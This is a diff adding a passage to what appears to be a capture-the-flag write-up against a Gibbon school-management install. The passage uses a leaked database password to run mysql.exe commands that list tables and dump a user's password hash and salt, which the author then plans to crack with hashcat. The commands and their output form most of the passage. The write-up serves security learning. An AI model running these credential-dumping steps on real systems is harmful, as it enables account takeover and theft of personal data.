@@ -107,6 +107,37 @@ $databasePassword = 'MisterGibbs!Parrot!?1';
 $databaseName = 'gibbon';
 ```
 
-So, we can access the DB
+So, we can access the DB! I change to the `/xampp/mysql/bin` folder which has `mysql.exe`. This can be used to read Tables and it's contents. 
+```
+PS C:\xampp\mysql\bin> .\mysql.exe -uMrGibbonsDB -p'MisterGibbs!Parrot!?1' gibbon -e 'show tables';
+```
+
+A lot of tables are listed. I try to look for any user or student or person table. There is a **gibbonperson** table. So, lets describe it.
+```
+PS C:\xampp\mysql\bin> .\mysql.exe -uMrGibbonsDB -p'MisterGibbs!Parrot!?1' gibbon -e 'describe gibbonperson';
+Field	Type	Null	Key	Default	Extra
+gibbonPersonID	int(10) unsigned zerofill	NO	PRI	NULL	auto_increment
+title	varchar(5)	NO		NULL	
+surname	varchar(60)	NO			
+firstName	varchar(60)	NO			
+preferredName	varchar(60)	NO			
+officialName	varchar(150)	NO		NULL	
+nameInCharacters	varchar(60)	NO		NULL	
+gender	enum('M','F','Other','Unspecified')	NO		Unspecified	
+username	varchar(20)	NO	UNI	NULL	
+passwordStrong	varchar(255)	NO		NULL	
+passwordStrongSalt	varchar(255)	NO		NULL	
+passwordForceReset	enum('N','Y')	NO		N
+```
+
+And this one has a "passwordStrong" with "Salt" fields. So we can extract thoes and try to crack it with hascat.
+```
+PS C:\xampp\mysql\bin> .\mysql.exe -uMrGibbonsDB -p'MisterGibbs!Parrot!?1' gibbon -e 'select username,passwordStrong,passwordStrongSalt from  gibbonperson';
+username	passwordStrong	passwordStrongSalt
+f.frizzle	067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03	/aACFhikmNopqrRTVz2489
+```
+
+In Gibbon, the passwords are stored as SHA256 where salt is prepended.
+
 
 
